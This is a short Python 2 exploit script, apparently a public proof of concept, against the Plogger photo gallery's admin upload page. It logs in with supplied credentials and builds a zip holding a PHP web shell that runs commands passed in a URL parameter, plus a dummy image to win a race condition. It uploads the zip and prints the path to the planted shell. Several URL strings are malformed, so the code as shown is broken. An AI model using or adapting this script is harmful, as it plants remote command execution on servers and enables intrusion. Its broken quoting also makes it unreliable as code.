#!/usr/bin/env python
import requests
import zipfile
import zlib
import commands
import time
import os
import hashlib
HOST = '<your host here>'
MAGIC = hashlib.sha1(time.asctime()).hexdigest()
session = requests.session()
print "Log in "
username = '<username>'
password = '<password>'
session.post('http://'www.example.com"/plog-admin/plog-upload.php", data={
"plog_username": username,
"plog_password": password,
"action": "log_in"
})
print "Creating poisoned gift"
## Write the backdoor
backdoor = open(MAGIC + '.php', 'w+', buffering = 0)
backdoor.write("<?php system($_GET['cmd']) ?>")
backdoor.close
## Add true image file to block the race condition (mandatory not null)
image = open(MAGIC + '.png', 'w+', buffering = 0)
image.write('A')
image.close
gift = zipfile.ZipFile(MAGIC + '.zip', mode = 'w')
gift.write(MAGIC + '.php')
gift.write(MAGIC + '.png')
gift.close
os.remove(MAGIC + '.php')
os.remove(MAGIC + '.png')
gift = open(MAGIC + '.zip', 'rb')
files= { "userfile": ("archive.zip", gift)}
session.post('http://'www.example.com'/plog-admin/plog-upload.php', files=files,
data = {
"destination_radio":"existing",
"albums_menu" : "1",
"new_album_name":"",
"collections_menu":"1",
"upload":"Upload"
})
print 'Here we go !! ==> http://'www.example.com'/plog-content/uploads/archive/' + MAGIC + '.php'
